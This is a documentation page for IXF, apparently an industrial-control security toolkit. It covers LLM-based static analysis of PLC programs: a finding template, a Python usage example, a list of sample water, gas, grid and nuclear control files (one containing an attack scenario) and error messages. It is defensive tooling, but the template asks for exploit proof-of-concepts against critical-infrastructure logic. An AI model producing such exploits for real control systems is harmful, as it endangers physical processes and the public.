Every SAST finding includes the following fields:

```
FINDING [SEVERITY: <CRITICAL|HIGH|MEDIUM|LOW|INFO>]
  Title:        Short, descriptive finding name
  Location:     Filename, line number(s)
  Category:     One of 8 analysis categories
  Type:         Specific vulnerability type
  Code:         Relevant code snippet (sanitized if credentials present)
  Issue:        Explanation of why this is a security problem
  Attack Vector: How an attacker would exploit this (protocol, register, method)
  Physical Impact: Real-world consequence to the controlled process
  MITRE ATT&CK for ICS: Technique IDs and names
  Exploit PoC:  Short exploit demonstration (for CRITICAL and HIGH only)
  Remediation:  Specific, actionable code fix
  References:   Standards, CVE references, vendor advisories
  Residual Risk: Any remaining risk after remediation
```

---

## Running SAST from the Python API

```python
import asyncio
from industrialxpl.core.sast.llm_provider import LLMProvider
from industrialxpl.core.sast.plc_parsers import load_plc_files, sanitize_code
from industrialxpl.core.sast.prompts import build_sast_prompt

async def run_sast_analysis(file_path: str, provider: str = "gemini") -> str:
    """Run SAST analysis on a PLC source file."""
    # Load and sanitize
    code = load_plc_files(file_path)
    sanitized, redactions = sanitize_code(code)
    print(f"[*] Sanitized: {redactions['credentials']} credentials, {redactions['ips']} IPs")

    # Build prompt
    prompt = build_sast_prompt(sanitized, mode="sast")

    # Get LLM provider
    llm = LLMProvider.get_active()
    if not llm:
        raise ValueError("No LLM provider configured. Set API key via env var.")

    # Run analysis
    result = await llm.complete(prompt)
    return result

# Usage
if __name__ == "__main__":
    result = asyncio.run(run_sast_analysis("/opt/plc_projects/water_treatment.st"))
    print(result)
```

---

## Example Files Included in IXF

IXF ships with 17 example PLC source files in `.tmp/sast_results/` and referenced in the distribution. These are for testing SAST functionality:

| File | Description | Process Type |
|------|-------------|--------------|
| `water_treatment.st` | Municipal water treatment plant | Water/wastewater |
| `water_treatment_chemical_dosing.st` | Chemical dosing subsystem | Water/wastewater |
| `gas_pipeline_pressure_control.st` | Natural gas pipeline SCADA | Oil & gas |
| `oil_refinery_process.st` | Crude oil distillation unit | Oil & gas |
| `power_grid_substation.st` | Power substation protection relay | Electric utility |
| `wind_farm_scada.st` | Wind turbine farm control | Renewable energy |
| `nuclear_reactor_cooling.st` | Reactor coolant system | Nuclear (simulation only) |
| `GRFICSv3_655326.st` | GRFICSv3 chemical process simulation | Chemical |
| `GRFICSv3_690525.st` | GRFICSv3 variant (normal operation) | Chemical |
| `GRFICSv3_attack.st` | GRFICSv3 with attack scenario embedded | Chemical |
| `GRFICSv3_blank.st` | GRFICSv3 template (minimal logic) | Chemical |
| `GRFICSv3_chemical.st` | GRFICSv3 chemical batch process | Chemical |
| `GRFICSv3_simplified_te.st` | GRFICSv3 Tennessee Eastman simplified | Chemical |
| `compressor_control.il` | Gas compressor IL program | Industrial |
| `building_automation.fbd` | HVAC and building control | Building automation |
| `robot_cell_ladder.ld` | Robotic cell PLC ladder | Manufacturing |
| `substation_protection.cfc` | CFC protection relay logic | Electric utility |

---

## Error Handling

### API Key Missing

```
ixf > sast /opt/plc.st
[-] No LLM provider configured.
[i] Option 1: Set environment variable:
    export GOOGLE_AI_STUDIO_API_KEY=AIzaSy...
[i] Option 2: Use llm-key command:
    ixf > llm-key gemini AIzaSy...
[i] Available providers: openai, anthropic, gemini, deepseek, grok
```

### File Not Found

```
ixf > sast /nonexistent/path.st
[-] File not found: /nonexistent/path.st
[i] Check the path and try again.
[i] For a directory: sast /path/to/project/
[i] For a file: sast /path/to/program.st
```

### Code Truncation Warning

```
ixf > sast /large_project/ --mode sast
[*] Target: /large_project/ (47 files, 12,450 lines)
[*] Token count: 187K tokens
[!] Code size exceeds provider limit (128K for openai).
[!] Truncating to 128K tokens. Last 7 files excluded from analysis.
[!] Excluded files:
    - /large_project/subsystem_g.st (12K tokens)
    - /large_project/subsystem_h.st (8K tokens)
    - ...
[i] For complete analysis:
    - Analyze subdirectories separately
    - Switch to gemini (1M token limit): llm-key gemini AIzaSy...
    - Or analyze most critical files individually
[*] Continuing with available 128K tokens...
```

### LLM API Error

```
ixf > sast /opt/plc.st
[*] Sending to LLM...
[-] LLM API error (gemini): 429 Too Many Requests — quota exceeded
[i] Wait and retry, or switch to a different provider:
    ixf > llm-key openai sk-...
[i] Or use the GOOGLE_AI_STUDIO_API_KEY for free tier (with limits)
```

### Unsupported File Extension

```
ixf > sast /opt/firmware.exe
[!] Unknown file extension: .exe
[i] Supported: .st, .fbd, .ladder, .il, .sfc, .cfc, .xml, .aml, .py, .c, .cpp, .go, .js, .rb, .pl, .java
[i] Tip: Use --mode reverse for binary firmware files
[*] Attempting best-effort analysis...
```

---

*Previous: [MITRE ATT&CK for ICS](06-mitre-attack-ics.md) | Next: [Protocols & Vendors](08-protocols-vendors.md)*
